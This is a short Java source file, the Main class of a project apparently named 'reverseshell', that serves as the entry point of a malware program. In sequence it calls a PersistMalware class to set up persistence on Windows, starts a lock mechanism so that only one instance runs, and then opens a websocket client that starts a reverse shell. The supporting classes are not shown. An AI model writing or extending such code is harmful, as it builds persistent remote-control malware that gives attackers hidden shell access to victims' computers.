package com.mtattab.reverseshell;


import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.service.impl.ReverseShell;
import com.mtattab.reverseshell.service.persistence.PersistMalware;
import com.mtattab.reverseshell.util.LockMechanismUtil;

import java.net.URISyntaxException;

public class Main {



    public static void main(String[] args) {

//        try to establish persistence
        PersistMalware persistMalware = new PersistMalware();
        System.out.println(persistMalware.createPersistenceWindows());
//        check if the software is already alive
        LockMechanismUtil.startLockMechanism();


//        start reverse shell
        WebsocketReverseShellService reverseShell= new ReverseShell();
        reverseShell.createClient();
        reverseShell.startReverseShell();
    }




}

